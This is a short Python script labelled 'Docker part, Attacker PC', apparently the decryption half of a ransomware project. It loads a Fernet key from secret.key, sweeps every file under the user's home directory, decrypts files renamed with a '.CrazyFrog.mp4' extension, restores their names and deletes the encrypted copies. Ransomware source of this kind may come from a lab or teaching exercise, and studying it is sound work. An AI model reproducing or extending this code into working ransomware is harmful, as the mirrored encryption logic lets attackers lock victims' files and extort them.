#####Docker part, Attacker PC#####
from cryptography.fernet import Fernet
import os
import glob

#with open('secret.key','rb') as magic_file:  #was secret.key
#    key = magic_file.read()
#    magic_file.close()

file = open('secret.key', 'rb')  # Open the file as wb to read bytes
key = file.read()  # The key will be type bytes
file.close()

#print(f'your key is: {key}') #debugging
fernet = Fernet(key)




homeDir = os.path.expanduser('~')
files = glob.glob(f'{homeDir}/**/*.*', recursive=True) #grabs folder we want to enc   f'{homeDir}/**/*.*', recursive=True) 


file_list=[]
for filename in files:
    if ".key" not in filename and ".py" not in filename:
        #print(f'im looking at: {filename}')
        file_list.append(filename)


for entry in file_list: #was files
    with open(entry, 'rb') as f:
        f_bytes = f.read()
        
    f_bytes_decrypt = fernet.decrypt(f_bytes)
    
    fileName = str(entry).replace('.CrazyFrog.mp4','')     ##added this replaces the old 'enc' extensions with original extensions


   # extension = os.path.splitext(fileName)[1] ###gets all extensions
    
    
    #print(fileName, extension)
    
    decFile = fileName #+ extension  ##works       
    with open(decFile,'wb') as f:
        f.write(f_bytes_decrypt)
        os.remove(entry)    #removes the old encrypted file

print("successfully decrypted all files")